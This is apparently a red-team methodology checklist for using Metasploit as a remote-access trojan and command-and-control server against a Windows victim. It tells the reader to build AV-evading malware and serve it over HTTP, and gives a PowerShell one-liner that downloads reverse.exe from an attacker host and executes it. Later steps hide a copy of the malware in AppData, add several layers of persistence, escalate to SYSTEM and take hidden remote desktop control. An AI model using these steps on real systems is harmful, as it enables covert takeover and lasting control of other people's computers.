
> For the next demonstration we will use metasploit as a RAT / C2

- [ ] First create a malware that evade AVs, see [[AV Evasion]]
- [ ] Then serve your malware with a simple http server with python
- [ ] Start you metasploit listener and "set ExitOnSession false" to contiously listen
- [ ] The victim have to download and execute the malware : 
```powershell
wget http://192.168.0.12:8000/reverse.exe -o $env:TEMP\jkr.exe; Invoke-Item $env:TEMP\jkr.exe
# NOTE : Here our malware is named jkr.exe
```
- [ ] Then duplicate your metasploit sessions by rerunning your malware one more time (we do this because we want a backup session in case we broke our current session)
- [ ] Then apply a first persistence at user level, best to see: [[Methodology/Red/PostExploitation/Persistence/Windows/Run on boot]] 
- [ ] Then elevate your privileges, best to see : [[ask for UAC]]
- [ ] Duplicate your malware elsewhere in the filesystem (in a less obvious location), for example the `AppData\Roaming` directory and use this new copy of your malware for new steps
```powershell
cp $env:Temp\jkr.exe "C:\Users\talion\AppData\Roaming\"
```
- [ ] Once you are `NT AUTHORITY\SYSTEM`, apply a second persistence with higher privileges, see [[Methodology/Red/PostExploitation/Persistence/Windows/Services]] or [[Methodology/Red/PostExploitation/Persistence/Windows/Scheduled tasks]]
- [ ] Install a third more stealth and resilient persistence with [[Velociraptor]]
- [ ] Then get a remote GUI desktop, you could take a look at [[metasploit vnc]], [[metasploit rdp]], [[rustdesk]] and [[HowToEnableRDP]], or check Hidden VNC (HVNC) techniques
